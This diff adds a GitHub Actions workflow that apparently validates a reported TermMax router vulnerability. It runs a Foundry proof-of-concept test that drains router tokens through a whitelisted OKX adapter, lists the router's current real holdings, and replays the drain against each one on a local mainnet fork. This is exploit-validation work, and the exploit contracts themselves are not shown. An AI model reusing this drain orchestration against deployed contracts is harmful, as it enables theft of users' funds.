@@ -1,0 +1,131 @@
+name: termmax-tm-o1-final
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+    paths:
+      - 'termmax-live-gate-trigger.txt'
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+
+      - name: Read-only deployed state and full Router token inventory
+        continue-on-error: true
+        shell: bash
+        run: |
+          set +e
+          mkdir -p evidence/state evidence/inventory evidence/tests
+          forge --version > evidence/FOUNDRY_VERSION.txt
+          SCAN_START_BLOCK=99999999 OUT_DIR=evidence/state python3 scripts/termmax_live_gate_v2.py > evidence/state/EXECUTION.log 2>&1
+          echo "$?" > evidence/state/EXIT_STATUS.txt
+          OUT_DIR=evidence/inventory python3 scripts/termmax_token_inventory.py > evidence/inventory/EXECUTION.log 2>&1
+          echo "$?" > evidence/inventory/EXIT_STATUS.txt
+          cat evidence/state/EXECUTION.log
+          cat evidence/inventory/EXECUTION.log
+          exit 0
+
+      - name: Execute exact-source unit PoC with deterministic build fix
+        continue-on-error: true
+        shell: bash
+        run: |
+          set +e
+          git clone https://github.com/term-structure/termmax-contract-v2.git termmax > evidence/tests/CLONE.log 2>&1
+          cd termmax || exit 0
+          git checkout e314f3f849577dfecd4614f148c4df81fdf8c72d >> ../evidence/tests/CLONE.log 2>&1
+          git rev-parse HEAD > ../evidence/tests/TERMMAX_GIT_HEAD.txt
+          forge soldeer update > ../evidence/tests/SOLDEER.log 2>&1
+          echo "$?" > ../evidence/tests/SOLDEER_EXIT_STATUS.txt
+          cp contracts/v2/factory/TermMaxPriceFeedFactoryV2.sol contracts/v2/factory/TermMaxPricefeedFactoryV2.sol
+          echo 'case-sensitive alias for an unrelated broken integration-test import' > ../evidence/tests/BUILD_FIX.txt
+          cp ../poc/TERMMAX_TM_O1_CI_POC.t.sol test/v2/TermMaxOkxArbitraryTargetDrainPoC.t.sol
+          git diff --no-index /dev/null test/v2/TermMaxOkxArbitraryTargetDrainPoC.t.sol > ../evidence/tests/POC_TEST_ONLY.diff 2>&1
+          forge test --use 0.8.30 --optimizer-runs 1 --via-ir \
+            --match-contract TermMaxOkxArbitraryTargetDrainPoC \
+            --match-test test_PoC_WhitelistedOkxAdapterDrainsUnrelatedRouterTokenViaForgedReturn \
+            -vvvv > ../evidence/tests/TM_O1_UNIT.log 2>&1
+          echo "$?" > ../evidence/tests/TM_O1_UNIT_EXIT_STATUS.txt
+          cat ../evidence/tests/TM_O1_UNIT.log
+          exit 0
+
+      - name: Execute deployed local-mainnet-fork drain against each current holding
+        continue-on-error: true
+        shell: bash
+        run: |
+          set +e
+          if [ ! -f evidence/inventory/SUMMARY.json ] || [ ! -d termmax ]; then
+            echo missing-prerequisite > evidence/tests/FORK_SKIPPED.txt
+            exit 0
+          fi
+          python3 - <<'PY' > evidence/tests/VICTIMS.tsv
+          import json
+          s=json.load(open('evidence/inventory/SUMMARY.json'))
+          for h in s.get('positiveHoldings',[]): print(h['token'],h.get('symbol') or '',h['balance'],h.get('decimals'),h.get('normalized'),sep='\t')
+          PY
+          endpoint=$(python3 -c "import json;print(json.load(open('evidence/inventory/SUMMARY.json'))['rpc'])")
+          block=$(python3 -c "import json;print(json.load(open('evidence/inventory/SUMMARY.json'))['snapshotBlock'])")
+          if [ ! -s evidence/tests/VICTIMS.tsv ]; then
+            echo no-current-router-erc20-holding > evidence/tests/FORK_SKIPPED.txt
+            exit 0
+          fi
+          cd termmax
+          success=0
+          while IFS=$'\t' read -r token symbol balance decimals normalized; do
+            safe=$(echo "$token" | tr '[:upper:]' '[:lower:]' | tr -cd '0-9a-fx')
+            MAINNET_RPC_URL="$endpoint" FORK_BLOCK="$block" VICTIM_TOKEN="$token" \
+              forge test --use 0.8.30 --optimizer-runs 1 --via-ir \
+              --match-contract TermMaxOkxLiveForkDrainPoC \
+              --match-test test_PoC_LiveForkDrainCurrentRouterBalance \
+              -vvvv > "../evidence/tests/FORK_${safe}.log" 2>&1
+            status=$?
+            printf '%s\t%s\t%s\t%s\t%s\n' "$token" "$symbol" "$balance" "$status" "$normalized" >> ../evidence/tests/FORK_RESULTS.tsv
+            if [ "$status" -eq 0 ]; then
+              echo "$token" > ../evidence/tests/FORK_SUCCESS_TOKEN.txt
+              cp "../evidence/tests/FORK_${safe}.log" ../evidence/tests/FORK_SUCCESS.log
+              success=1
+              break
+            fi
+          done < ../evidence/tests/VICTIMS.tsv
+          echo "$success" > ../evidence/tests/FORK_SUCCESS_STATUS.txt
+          [ -f ../evidence/tests/FORK_SUCCESS.log ] && cat ../evidence/tests/FORK_SUCCESS.log
+          exit 0
+
+      - name: Build verdict and manifest
+        if: always()
+        shell: bash
+        run: |
+          set +e
+          python3 - <<'PY'
+          import json,pathlib
+          e=pathlib.Path('evidence')
+          def read(p):
+           q=e/p
+           return q.read_text().strip() if q.exists() else None
+          state=json.loads((e/'state/SUMMARY.json').read_text()) if (e/'state/SUMMARY.json').exists() else {}
+          inv=json.loads((e/'inventory/SUMMARY.json').read_text()) if (e/'inventory/SUMMARY.json').exists() else {}
+          v={'unitExit':read(pathlib.Path('tests/TM_O1_UNIT_EXIT_STATUS.txt')),'forkSuccess':read(pathlib.Path('tests/FORK_SUCCESS_STATUS.txt')),'forkToken':read(pathlib.Path('tests/FORK_SUCCESS_TOKEN.txt')),'adapterWhitelisted':state.get('adapterWhitelisted'),'routerPaused':state.get('routerPaused'),'routerImplementation':(state.get('addresses') or {}).get('implementation'),'snapshotBlock':inv.get('snapshotBlock'),'snapshotBlockHash':inv.get('snapshotBlockHash'),'candidateTokenCount':inv.get('candidateTokenCount'),'positiveHoldingCount':inv.get('positiveHoldingCount'),'positiveHoldings':inv.get('positiveHoldings')}
+          if v['unitExit']=='0' and v['forkSuccess']=='1': v['verdict']='LIVE_FORK_DRAIN_VALIDATED'
+          elif v['unitExit']=='0' and v['adapterWhitelisted'] is True and (v['positiveHoldingCount'] or 0)==0: v['verdict']='MECHANIC_VALIDATED_CURRENT_FUNDS_AT_REST_ZERO'
+          elif v['unitExit']=='0': v['verdict']='MECHANIC_VALIDATED_LIVE_GATE_INCOMPLETE'
+          else: v['verdict']='NOT_VALIDATED'
+          (e/'GATE_VERDICT.json').write_text(json.dumps(v,indent=2));print(json.dumps(v,indent=2))
+          PY
+          find evidence -type f -print0 | sort -z | xargs -0 sha256sum > evidence/SHA256SUMS.txt
+          find evidence -type f -printf '%p\t%s bytes\n' | sort > evidence/FILE_LIST.txt
+
+      - name: Upload final evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: termmax-tm-o1-final-evidence
+          path: evidence/
+          retention-days: 7
